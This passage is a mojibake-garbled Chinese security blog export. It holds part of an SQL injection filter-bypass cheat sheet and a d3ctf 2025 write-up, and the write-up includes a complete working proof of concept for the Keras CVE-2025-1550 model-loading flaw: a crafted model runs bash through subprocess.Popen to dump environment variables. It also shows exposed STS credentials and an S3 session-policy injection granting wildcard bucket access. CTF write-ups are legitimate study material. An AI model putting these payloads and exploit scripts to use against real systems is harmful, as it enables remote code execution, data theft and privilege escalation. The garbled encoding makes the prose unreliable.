uniunionon</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿‡æ»¤å¤§å°å†™ï¼Œé‚£å°±éšæ„æ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unionã€UNION -&gt; UnIoN</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å…³é”®å­—ç»„åˆæ¯”å¦‚è¿‡æ»¤äº†<code>UNION SELECT</code><br>å¯ä»¥æ”¹ç”¨<code>UNION ALL SELECT</code><br>æˆ–è€…ç»“åˆå†…è”æ³¨é‡Šæ„é€ : <code>/*!UNION*/SELECT UNION/**/SELECT</code><br>æˆ–è€…æ’å…¥å…¶ä»–å¯ä»£æ›¿ç©ºæ ¼çš„ç¬¦å·</p><ul><li><h3 id="è¿‡æ»¤-information-schema"><a href="#è¿‡æ»¤-information-schema" class="headerlink" title="è¿‡æ»¤ information_schema"></a>è¿‡æ»¤ information_schema</h3></li></ul><p>InnoDB å¼•æ“<br>åœ¨<code>MySQL 5.6</code>åŠä»¥ä¸Š<br>ç”¨<code>mysql.innodb_table_stats</code><br>ä»£æ›¿<code>information_schema.tables</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from mysql.innodb_table_stats;</span><br><span class="line">+---------------+-----------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| database_name | table_name      | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |</span><br><span class="line">+---------------+-----------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| bookmanage    | book            | 2024-11-08 16:57:53 |    100 |                    1 |                        0 |</span><br><span class="line">| bookmanage    | person          | 2024-11-08 16:57:43 |    103 |                    1 |                        0 |</span><br><span class="line">| bookmanage    | record          | 2024-11-08 16:58:04 |    100 |                    1 |                        0 |</span><br><span class="line">| mysql         | component       | 2024-07-29 00:04:12 |      0 |                    1 |                        0 |</span><br><span class="line">| sakila        | actor           | 2024-07-29 00:05:44 |    200 |                    1 |                        1 |</span><br><span class="line">| sakila        | address         | 2024-07-29 00:04:52 |    603 |                    6 |                        1 |</span><br><span class="line">| sakila        | category        | 2024-07-29 00:04:52 |     16 |                    1 |                        0 |</span><br><span class="line">| sakila        | city            | 2024-07-29 00:04:52 |    600 |                    3 |                        1 |</span><br><span class="line">| sakila        | country         | 2024-07-29 00:04:52 |    109 |                    1 |                        0 |</span><br><span class="line">| sakila        | customer        | 2024-07-29 00:04:52 |    599 |                    5 |                        3 |</span><br><span class="line">| sakila        | film            | 2024-07-29 00:04:52 |   1000 |                   12 |                        5 |</span><br><span class="line">| sakila        | film_actor      | 2024-07-29 00:04:52 |   5462 |                   12 |                        5 |</span><br><span class="line">| sakila        | film_category   | 2024-07-29 00:04:53 |   1000 |                    4 |                        1 |</span><br><span class="line">| sakila        | film_text       | 2024-07-29 00:04:52 |   1000 |                   11 |                        1 |</span><br><span class="line">| sakila        | inventory       | 2024-07-29 00:04:53 |   4581 |                   11 |                       12 |</span><br><span class="line">| sakila        | language        | 2024-07-29 00:04:53 |      6 |                    1 |                        0 |</span><br><span class="line">| sakila        | payment         | 2024-07-29 00:04:54 |  16500 |                   97 |                       39 |</span><br><span class="line">| sakila        | rental          | 2024-07-29 00:05:04 |  15423 |                   97 |                       73 |</span><br><span class="line">| sakila        | staff           | 2024-07-29 00:05:14 |      2 |                    4 |                        2 |</span><br><span class="line">| sakila        | store           | 2024-07-29 00:05:24 |      2 |                    1 |                        2 |</span><br><span class="line">| sys           | sys_config      | 2024-07-29 00:04:13 |      6 |                    1 |                        0 |</span><br><span class="line">| world         | city            | 2024-07-29 00:05:34 |   4035 |                   25 |                        7 |</span><br><span class="line">| world         | country         | 2024-07-29 00:05:54 |    239 |                    7 |                        0 |</span><br><span class="line">| world         | countrylanguage | 2024-07-29 00:06:04 |    984 |                    6 |                        4 |</span><br><span class="line">+---------------+-----------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">24 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><h3 id="è¿‡æ»¤æ³¨é‡Šç¬¦"><a href="#è¿‡æ»¤æ³¨é‡Šç¬¦" class="headerlink" title="è¿‡æ»¤æ³¨é‡Šç¬¦"></a>è¿‡æ»¤æ³¨é‡Šç¬¦</h3></li></ul><p>å¦‚æœæ‰€æœ‰çš„æ³¨é‡Šç¬¦<code>--  # /**/ /*!*/</code>éƒ½è¢«è¿‡æ»¤ï¼Œ<br>æ— æ³•å¿½ç•¥åé¢çš„è¯­å¥,<br>å¯ä»¥æ”¹å˜é—­åˆæ–¹å¼ä»¥é¿å…è¯­æ³•é”™è¯¯:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">AND</span> passwd<span class="operator">=</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>å‘é€payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;OR&amp;passwd=OR&#x27;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="keyword">OR</span><span class="string">&#x27; AND passwd=&#x27;</span><span class="keyword">OR</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é—­åˆå¼•å·</p><ul><li><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- SELECT username FROM users;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">char</span>(<span class="number">117</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>) <span class="keyword">FROM</span> users;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x757365726e616d65</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure><ul><li><h3 id="èŠ±æ‹¬å·è¯­æ³•"><a href="#èŠ±æ‹¬å·è¯­æ³•" class="headerlink" title="èŠ±æ‹¬å·è¯­æ³•"></a>èŠ±æ‹¬å·è¯­æ³•</h3></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &#123;a DATABASE()&#125;;</span><br></pre></td></tr></table></figure><p>èŠ±æ‹¬å·å·¦è¾¹æ˜¯æ³¨é‡Šï¼ˆå·¦è¾¹å¯ä»¥æ˜¯ä»»æ„å­—æ¯ï¼Œä½†ä¸èƒ½æ˜¯æ•°å­—ï¼‰ï¼Œ<br>å³è¾¹æ˜¯æŸ¥è¯¢è¯­å¥çš„ä¸€éƒ¨åˆ†</p><ul><li><h3 id="å‡½æ•°æ›¿æ¢"><a href="#å‡½æ•°æ›¿æ¢" class="headerlink" title="å‡½æ•°æ›¿æ¢"></a>å‡½æ•°æ›¿æ¢</h3></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark() =&gt; sleep()</span><br><span class="line">hex() bin() =&gt; ascii()</span><br><span class="line">concat() concat_ws() =&gt; group_concat()</span><br><span class="line">substr() mid() left() right() elt() =&gt; substring()</span><br><span class="line">char_length() =&gt; length()</span><br></pre></td></tr></table></figure><ul><li><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨ GBK ç¼–ç ä¸‹ï¼Œéƒ¨åˆ†å­—ç¬¦å¯ä»¥ä¸åç»­å­—ç¬¦æ‹¼æ¥å½¢æˆæ–°çš„åˆæ³•å­—ç¬¦ã€‚%df åœ¨ GBK ç¼–ç ä¸­æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„åŒå­—èŠ‚å­—ç¬¦ Å¸ï¼Œå¦‚æœæ•°æ®åº“é‡‡ç”¨ GBK ç¼–ç ï¼Œåˆ™ %df å¯èƒ½ä¼šä¸åç»­çš„å•å­—ç¬¦æ‹¼æ¥å½¢æˆä¸€ä¸ªå®Œæ•´çš„åŒå­—èŠ‚å­—ç¬¦</span><br><span class="line"></span><br><span class="line">æœ‰æ—¶å€™æœåŠ¡ç«¯ä¼šå¯¹è¾“å…¥ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œåœ¨å‰é¢æ·»åŠ ä¸€ä¸ª \ï¼Œå®ƒçš„ URL ç¼–ç æ˜¯ %5cã€‚å¦‚æœè¾“å…¥ä¸€ä¸ª &#x27;ï¼Œæ·»åŠ åæ–œæ ç¼–ç åå°±æ˜¯ %5c%27ã€‚æ­¤æ—¶åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ª %df -&gt; %df%5c%27ï¼Œå¦‚æœæ•°æ®åº“é‡‡ç”¨ GBK ç¼–ç ï¼Œä¼šè®¤ä¸º %df%5c æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä½¿å¾— %27 å³ &#x27; å¹¶æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œå¯ä»¥æ­£å¸¸è¿›è¡Œæ³¨å…¥</span><br></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><a href="https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed">https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d3ctfå¤ç°</title>
      <link href="/2025/06/05/2025d3ctf/"/>
      <url>/2025/06/05/2025d3ctf/</url>
      
        <content type="html"><![CDATA[<h3 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h3><p>å®¡æºç é¡¹ç›®<br>ä¾èµ–çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keras==3.8.0</span><br><span class="line">flask</span><br><span class="line">tensorflow</span><br></pre></td></tr></table></figure><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä¸Šä¼ ä¸€ä¸ªä¸å¤§äº50MBçš„æ–‡ä»¶ï¼Œ<br>æ ¹æ®<code>keras</code>çš„ç‰ˆæœ¬æ‰¾åˆ°<code>CVE-2025-1550</code><br>åœ¨<code>loal_model</code>å¤„è§¦å‘æ¼æ´ï¼Œå¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œ<br>å‚è€ƒè¿™ä¸ªé“¾æ¥ä½¿ç”¨çš„POC:<br><a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">model_name = <span class="string">&quot;test.keras&quot;</span></span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(<span class="number">100</span>, <span class="number">28</span> * <span class="number">28</span>)</span><br><span class="line">y_train = np.random.rand(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(<span class="number">1</span>, activation=<span class="string">&#x27;linear&#x27;</span>, input_dim=<span class="number">28</span> * <span class="number">28</span>)])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)</span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    config = json.loads(f.read(<span class="string">&quot;config.json&quot;</span>).decode())</span><br><span class="line"></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>] = <span class="string">&quot;keras.models&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;class_name&quot;</span>] = <span class="string">&quot;Model&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;config&quot;</span>] = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;layers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;class_name&quot;</span>: <span class="string">&quot;function&quot;</span>,</span><br><span class="line">            <span class="string">&quot;config&quot;</span>: <span class="string">&quot;Popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;module&quot;</span>: <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="string">&quot;args&quot;</span>: [[<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;env&gt;&gt;index.html&quot;</span>]], <span class="string">&quot;kwargs&quot;</span>: &#123;<span class="string">&quot;bufsize&quot;</span>: -<span class="number">1</span>&#125;&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">    <span class="string">&quot;input_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]],</span><br><span class="line">    <span class="string">&quot;output_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_read:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zip_write:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> zip_read.infolist():</span><br><span class="line">            <span class="keyword">if</span> item.filename != <span class="string">&quot;config.json&quot;</span>:</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&quot;config.json&quot;</span>, json.dumps(config))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Malicious model ready&quot;</span>)</span><br></pre></td></tr></table></figure><p>å…ˆåˆ›å»ºä¸€ä¸ªæ­£å¸¸çš„æ¨¡å‹ï¼Œç„¶åæ ¹æ®å…¶å‹ç¼©åŒ…çš„æ€§è´¨è§£å‹å¹¶ä¿®æ”¹config<br>ä¿®æ”¹ä¸€ä¸‹ç³»ç»Ÿå‘½ä»¤å°±å¯ä»¥ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FLAG=d3ctf&#123;moD3L-IO@D-r3@LIy-c4UsE5_rc383ad8b&#125;</span><br></pre></td></tr></table></figure><h3 id="d3invitation"><a href="#d3invitation" class="headerlink" title="d3invitation"></a>d3invitation</h3><p>æ˜¯ä¸€ä¸ªç”Ÿæˆé‚€è¯·å‡½çš„webæœåŠ¡<br>å…ˆæ­£å¸¸ä½¿ç”¨çœ‹ä¸€ä¸‹å…¨æµç¨‹<br><img src="/2025/06/05/2025d3ctf/1.png" alt="alt text"><br>å…¶ä¸­<code>/api/genSTSCreds</code>æ¥å£ï¼Œ<br>ä¼šæ ¹æ®æ–‡ä»¶åå‘æ”¾token:</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/genSTSCreds</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>35.241.98.126:31138</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://35.241.98.126:31138</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://35.241.98.126:31138/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;object_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;20240704193708.jpg&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 04 Jun 2025 12:53:24 GMT</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>668</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;access_key_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;7SWYYK5QNPONE8H3XMX9&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;secret_access_key&quot;</span><span class="punctuation">:</span><span class="string">&quot;fMKE5GeLwWTs2EyxYKkUOApocFKooJqM+bDJYcox&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;session_token&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiI3U1dZWUs1UU5QT05FOEgzWE1YOSIsImV4cCI6MTc0OTA0NTIwNCwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2TWpBeU5EQTNNRFF4T1RNM01EZ3VhbkJuSWwxOVhYMD0ifQ.s9NFu0aVSWX1rHAlgtaZ0kyHUqV1bfGzUsJsyvkmj9izO6Rf69VP15oz4LuWXChIrKa6uOWpuNyPN0e8X7dWdA&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>æŠŠè¿™ä¸€æ®µ<code>session_token</code>æ”¾jwtè§£ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;accessKey&quot;: &quot;7SWYYK5QNPONE8H3XMX9&quot;,</span><br><span class="line">  &quot;exp&quot;: 1749045204,</span><br><span class="line">  &quot;parent&quot;: &quot;B9M320QXHD38WUR2MIY3&quot;,</span><br><span class="line">  &quot;sessionPolicy&quot;: &quot;eyJWZXJzaW9uIjoiMjAxMi0xMC0xNyIsIlN0YXRlbWVudCI6W3siRWZmZWN0IjoiQWxsb3ciLCJBY3Rpb24iOlsiczM6R2V0T2JqZWN0IiwiczM6UHV0T2JqZWN0Il0sIlJlc291cmNlIjpbImFybjphd3M6czM6OjpkM2ludml0YXRpb24vMjAyNDA3MDQxOTM3MDguanBnIl19XX0=&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿˜æœ‰ä¸€æ®µ<code>sessionPolicy</code>ï¼Œä¹Ÿè§£ä¸€ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot;: [</span><br><span class="line">        &quot;s3:GetObject&quot;,</span><br><span class="line">        &quot;s3:PutObject&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot;: [</span><br><span class="line">        &quot;arn:aws:s3:::d3invitation/20240704193708.jpg&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯æ˜æ–‡äº†<br>æ–‡ä»¶æ± æ˜¯ç”¨AWSç­–ç•¥å‚¨å­˜çš„<br>å°è¯•åå‘ç°å¯ä»¥é—­åˆï¼Œå› ä¸ºæœåŠ¡ç«¯ç›´æ¥å¯¹æ–‡ä»¶åè¿›è¡Œæ‹¼æ¥<br>é‚£ä¹ˆä½¿ç”¨ä¸€ä¸‹æˆ‘ä»¬çš„wpä¸Šçš„æ–‡ä»¶åï¼Œæ‰‹åŠ¨æ‹¼å‡ºæ¥ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:PutObject&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:s3:::d3invitation/&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:PutObject&quot;</span><span class="punctuation">]</span></span><br><span class="line">            </span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:PutObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:ListAllMyBuckets&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:GetBucketLocation&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">     <span class="punctuation">&#125;</span></span><br><span class="line">    <span 